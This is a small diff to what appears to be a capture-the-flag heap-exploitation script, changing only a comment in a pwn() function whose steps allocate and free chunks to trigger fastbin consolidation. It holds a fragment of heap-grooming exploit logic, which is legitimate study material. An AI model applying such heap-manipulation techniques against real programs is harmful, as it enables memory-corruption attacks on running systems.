@@ -57,7 +57,7 @@ def pwn():
 	addt('T'*0x38) # transaction 1
 	addt('T'*0x80) # transaction 2
 
-	# create fastbins to consolidate afterwards
+	# create free fast chunk to consolidate afterwards
 	delc(coin(0))
 	# consolidate fastchunks
 	delt(transaction(2))
